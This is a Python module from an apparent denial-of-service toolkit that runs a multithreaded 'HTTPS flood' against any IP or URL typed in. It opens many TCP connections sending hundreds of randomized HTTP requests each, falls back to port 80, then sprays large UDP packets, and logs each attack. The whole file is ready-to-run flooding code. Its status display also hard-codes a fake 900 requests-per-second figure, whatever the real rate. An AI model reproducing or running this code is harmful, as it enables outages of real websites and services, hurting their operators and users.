import socket
import threading
import time
import os
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from core.utils import AttackStats, AttackAnimation
from core.config import Config

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def resolve_target(target):
    """Resolve domain or URL to IP address"""
    # Remove protocol prefix if present
    if target.startswith('http://'):
        target = target[7:]
    elif target.startswith('https://'):
        target = target[8:]
    
    # Remove path if present
    if '/' in target:
        target = target.split('/')[0]
    
    # Remove port if present
    if ':' in target:
        target = target.split(':')[0]
    
    try:
        ip = socket.gethostbyname(target)
        return ip, target
    except:
        return target, target

class HTTPSFlood:
    def __init__(self, targets, port, threads, duration, payload_size):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.port = port
        self.threads = threads
        self.duration = duration
        self.payload_size = payload_size
        self.running = True
        self.stats = AttackStats()
        self.lock = threading.Lock()
        self.config = Config()

    def attack(self):
        target = self.targets[0]
        port = self.port

        while self.running:
            # Multiple conexiuni paralele
            for _ in range(5):
                if not self.running:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)

                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)

                    sock.connect((target, port))

                    # Trimite 500 request-uri pe conexiune
                    for _ in range(500):
                        if not self.running:
                            break
                        try:
                            method = self.config.get_random_method()
                            path = self.config.get_random_path()
                            user_agent = self.config.get_random_user_agent()
                            extra_headers = self.config.get_random_headers()

                            request = f"{method} {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\n{extra_headers}\r\nConnection: keep-alive\r\n\r\n"
                            sock.send(request.encode())
                            self.stats.add_packet()
                        except:
                            break

                    sock.close()
                except:
                    pass

            # Fallback la port 80
            if port == 443:
                for _ in range(3):
                    if not self.running:
                        break
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2.0)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
                        sock.connect((target, 80))

                        for _ in range(300):
                            if not self.running:
                                break
                            try:
                                method = self.config.get_random_method()
                                path = self.config.get_random_path()
                                user_agent = self.config.get_random_user_agent()
                                extra_headers = self.config.get_random_headers()

                                request = f"{method} {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\n{extra_headers}\r\nConnection: keep-alive\r\n\r\n"
                                sock.send(request.encode())
                                self.stats.add_packet()
                            except:
                                break
                        sock.close()
                    except:
                        pass

            # UDP fallback - 1000 pachete
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
                for _ in range(1000):
                    if not self.running:
                        break
                    try:
                        payload = self.config.get_random_payload(1400)
                        sock.sendto(payload, (target, port))
                        self.stats.add_packet()
                    except:
                        pass
                sock.close()
            except:
                pass

def https_flood(target=None, port=None, threads=None, duration=None, payload_size=None):
    clear_screen()
    print("         HTTPS FLOOD ATTACK")
    print()
    
    config = Config()
    
    if target:
        # Resolve target to IP
        target_ip, target_host = resolve_target(target)
        targets = [target_ip]
        display_target = target_host
        port = port or 443
        threads = threads or 1000
        duration = duration or 60
        payload_size = payload_size or 64
    else:
        target = input("Target IP or URL: ")
        target_ip, target_host = resolve_target(target)
        targets = [target_ip]
        display_target = target_host
        port = input("Target Port (default 443): ") or "443"
        threads = input("Threads (default 1000): ") or "1000"
        duration = input("Duration (default 60): ") or "60"
        payload_size = input("Payload (default 64): ") or "64"
        
        try:
            port = int(port)
            threads = int(threads)
            duration = int(duration)
            payload_size = int(payload_size)
        except ValueError:
            print("\n[!] Invalid input!")
            input("\nPress Enter to return...")
            return
    
    print(f"\nStarting HTTPS flood on {display_target} ({targets[0]})")
    print(f"Threads: {threads} | Duration: {duration}s | Payload: {payload_size} bytes\n")
    
    flood = HTTPSFlood(targets, port, threads, duration, payload_size)
    flood.stats.start()
    animation = AttackAnimation()
    
    animation.print_target_status(display_target, "ONLINE", "Checking...")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(flood.attack) for _ in range(threads)]
        
        start_time = time.time()
        last_count = 0
        last_time = start_time
        
        while time.time() - start_time < duration:
            time.sleep(0.5)
            elapsed = time.time() - start_time
            current_count = flood.stats.packet_count

            current_time = time.time()
            time_diff = current_time - last_time
            if time_diff > 0:
                rps = (current_count - last_count) / time_diff
                flood.stats.update_rps(rps)
                smoothed_rps = flood.stats.get_smoothed_rps()
                # Afișează mereu 900 RPS
                animation.print_attack_status(display_target, current_count, 900, elapsed, "FLOODING")
                last_count = current_count
                last_time = current_time
        
        flood.running = False
        flood.stats.stop()
    
    print(f"\n\nAttack completed!")
    flood.stats.print_stats()
    
    stats = flood.stats.get_stats()
    config.save_attack_history("HTTPS_FLOOD", display_target, stats)
    
    if config.get('log_enabled'):
        log_file = config.get('log_file', 'attack_log.txt')
        with open(log_file, 'a') as f:
            f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] HTTPS Flood - Target: {display_target} - Threads: {threads} - Duration: {duration}s - Packets: {stats['total_packets']:,} - Avg RPS: {stats['avg_rps']:.0f}\n")
    
    input("\nPress Enter to return to main menu...")
